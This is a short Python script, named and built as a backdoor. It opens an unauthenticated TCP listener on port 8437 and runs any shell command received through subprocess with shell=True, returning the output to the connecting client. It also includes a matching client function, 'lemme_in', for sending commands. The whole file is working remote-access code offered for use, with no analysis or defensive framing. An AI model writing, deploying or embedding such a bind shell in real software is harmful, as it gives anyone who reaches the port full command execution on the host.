import socket
import os
import getpass
import subprocess
import platform

def door():
  ip = socket.gethostbyname(socket.gethostname())
  port = 8437
  print(f"Making backdoor with IP: {ip} and port: {port}")
  backdoor(ip, port)

def backdoor(ip, port):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.bind((ip, port))
  sock.listen(1)
  client, addr = sock.accept()
  header = f"""{getpass.getuser()}@{platform.node()}:{os.getcwd()}$ """
  print(f"Header: {header}")
  client.send(header.encode())

  while True:
    print("in while")
    #try:
    if True:
      cmd = client.recv(1024).decode("utf-8")
      print(f"Received: {cmd}")
      if not cmd:
        print("Connection closed")
        break
      comm = subprocess.Popen(str(cmd), shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      STDOUT, STDERR = comm.communicate()
      if not STDOUT:
        if not STDERR:
          client.send(" ".encode())
          print(" ")
        else:
          print(f"STDERR: {STDERR}")
          client.send(STDERR)
      else:
        print(f"STDOUT: {STDOUT}")
        client.send(STDOUT)
    #except Exception as e:
    #  print(f"ERROR: {e}")
    #  client.send("Error: {}".format(str(e)).encode())
  client.close()
  sock.close()



def lemme_in(ip,port):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((ip, port))
  input_header = sock.recv(1024)

  while True:
    command = input(input_header.decode()).encode()
    if command is b"":
      print("Please enter a command")
    else:
      sock.send(command)
      recv = sock.recv(1024)
      print(recv.decode())
  sock.close()
